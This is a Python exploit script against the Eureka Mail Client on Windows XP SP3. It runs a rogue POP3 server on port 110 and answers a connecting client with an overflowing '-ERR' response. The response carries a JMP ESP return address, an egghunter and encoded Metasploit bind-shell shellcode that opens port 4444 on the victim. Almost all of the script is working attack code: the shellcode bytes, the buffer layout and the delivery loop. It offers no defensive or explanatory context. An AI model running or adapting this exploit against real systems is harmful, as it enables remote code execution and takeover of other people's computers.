#!/usr/bin/python

banner = """
#----------------------------------------------#
Eureka Public Exploit - Egghunter - Bind Shell
#----------------------------------------------#
"""

import sys, socket
 
# egghunter (32 bytes)
egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"\x77\x30\x30\x74" # this is the egg: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")
 
# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=thread, LPORT=4444
 
bindshell = ("\xbb\xd3\x82\x28\x36\xd9\xc6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x56\x83\xee\xfc\x31\x5e\x0f\x03\x5e\xdc\x60\xdd\xca\x0a\xed"
"\x1e\x33\xca\x8e\x97\xd6\xfb\x9c\xcc\x93\xa9\x10\x86\xf6\x41"
"\xda\xca\xe2\xd2\xae\xc2\x05\x53\x04\x35\x2b\x64\xa8\xf9\xe7"
"\xa6\xaa\x85\xf5\xfa\x0c\xb7\x35\x0f\x4c\xf0\x28\xff\x1c\xa9"
"\x27\xad\xb0\xde\x7a\x6d\xb0\x30\xf1\xcd\xca\x35\xc6\xb9\x60"
"\x37\x17\x11\xfe\x7f\x8f\x1a\x58\xa0\xae\xcf\xba\x9c\xf9\x64"
"\x08\x56\xf8\xac\x40\x97\xca\x90\x0f\xa6\xe2\x1d\x51\xee\xc5"
"\xfd\x24\x04\x36\x80\x3e\xdf\x44\x5e\xca\xc2\xef\x15\x6c\x27"
"\x11\xfa\xeb\xac\x1d\xb7\x78\xea\x01\x46\xac\x80\x3e\xc3\x53"
"\x47\xb7\x97\x77\x43\x93\x4c\x19\xd2\x79\x23\x26\x04\x25\x9c"
"\x82\x4e\xc4\xc9\xb5\x0c\x81\x3e\x88\xae\x51\x28\x9b\xdd\x63"
"\xf7\x37\x4a\xc8\x70\x9e\x8d\x2f\xab\x66\x01\xce\x53\x97\x0b"
"\x15\x07\xc7\x23\xbc\x27\x8c\xb3\x41\xf2\x03\xe4\xed\xac\xe3"
"\x54\x4e\x1c\x8c\xbe\x41\x43\xac\xc0\x8b\xf2\xea\x0e\xef\x57"
"\x9d\x72\x0f\x46\x01\xfa\xe9\x02\xa9\xaa\xa2\xba\x0b\x89\x7a"
"\x5d\x73\xfb\xd6\xf6\xe3\xb3\x30\xc0\x0c\x44\x17\x63\xa0\xec"
"\xf0\xf7\xaa\x28\xe0\x08\xe7\x18\x6b\x31\x60\xd2\x05\xf0\x10"
"\xe3\x0f\x62\xb0\x76\xd4\x72\xbf\x6a\x43\x25\xe8\x5d\x9a\xa3"
"\x04\xc7\x34\xd1\xd4\x91\x7f\x51\x03\x62\x81\x58\xc6\xde\xa5"
"\x4a\x1e\xde\xe1\x3e\xce\x89\xbf\xe8\xa8\x63\x0e\x42\x63\xdf"
"\xd8\x02\xf2\x13\xdb\x54\xfb\x79\xad\xb8\x4a\xd4\xe8\xc7\x63"
"\xb0\xfc\xb0\x99\x20\x02\x6b\x1a\x40\xe1\xb9\x57\xe9\xbc\x28"
"\xda\x74\x3f\x87\x19\x81\xbc\x2d\xe2\x76\xdc\x44\xe7\x33\x5a"
"\xb5\x95\x2c\x0f\xb9\x0a\x4c\x1a")
 
buff = ("\x41" * 710);
retn = ("\x53\x93\x42\x7e"); #JMP ESP USER32.DLL XPSP3
nops = ("\x90" * 218);
junk = ("\xcc" * 2000);
sploit = ("-ERR " + buff + retn + egghunter + nops + junk + "w00tw00t" + bindshell);
 
print ("""
##########################################################
#
# Eureka Mail Client Remote Buffer Overflow Exploit (XPSP3)
# Tested On: Windows XPSP3
# Exploit Sent!
#
##########################################################
""")
 
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 110))
    s.listen(1)
    print ("[*] Listening on port 110.")
    print ("[*] Have someone connect to you.")
    print ("[*] Type <control>-c to exit.")
    conn, addr = s.accept()
    print '[*] Received connection from: ', addr
 
    while 1:
        conn.send(sploit)
    conn.close()
except:
    print ("[*] Done. Wait a bit for the egghunter then connect to the victim on port 4444")
